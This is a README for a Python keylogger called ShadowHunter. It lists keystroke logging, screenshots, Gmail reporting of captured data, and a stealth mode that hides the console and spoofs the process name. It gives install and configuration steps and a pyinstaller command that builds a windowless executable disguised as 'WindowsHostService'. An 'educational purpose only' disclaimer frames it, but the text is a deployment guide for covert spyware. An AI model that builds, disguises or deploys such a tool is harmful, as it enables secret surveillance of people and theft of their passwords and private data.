# ShadowHunter -  Keystroke Monitoring Tool

> ** Educational Purpose Only**  
> This tool is developed strictly for learning cybersecurity concepts, red team techniques, and defensive awareness.  
> **Do not use this tool on any system without explicit permission.** Unauthorized use is illegal.

---

## Features

- Real-time keystroke logging
- Automatic screenshot on window/tab change
- Periodic screenshots
- Email reporting (Gmail SMTP)
- Stealth mode (console hide + process name spoofing)
- Multi-threading architecture

---

## Requirements

- Windows OS
- Python 3.8 or higher
- Gmail account with App Password

---

## Installation

1. Clone the repository:
```bash
git clone https://github.com/MuhammadJawaid/ShadowHunter.git
```
cd ShadowHunter

2. Install dependencies:
```bash
pip install -r requirements.txt
```
3. Open shadowhuter.py and update these values:

PythonEMAIL_ADDRESS = "your_email@gmail.com"

EMAIL_PASSWORD = "your_16_char_app_password"

RECIPIENT_EMAIL = "your_email@gmail.com"

Note: Use Gmail App Password (not your normal password)

4. Run the tool:
```bash
python shadowhunter.py
```
## Creating Executable (.exe)
```bash
pip install pyinstaller

pyinstaller --onefile --noconsole --name "WindowsHostService" shadowhunter.py
```
The .exe will be generated in the dist folder.

## How to Stop the Tool

Open Task Manager → Details tab → End WindowsHostService.exe

Or restart the computer

## Disclaimer

This project is created only for educational and demonstration purposes as part of academic learning.
The developer is not responsible for any misuse of this tool.
Always obtain proper authorization before testing monitoring tools.
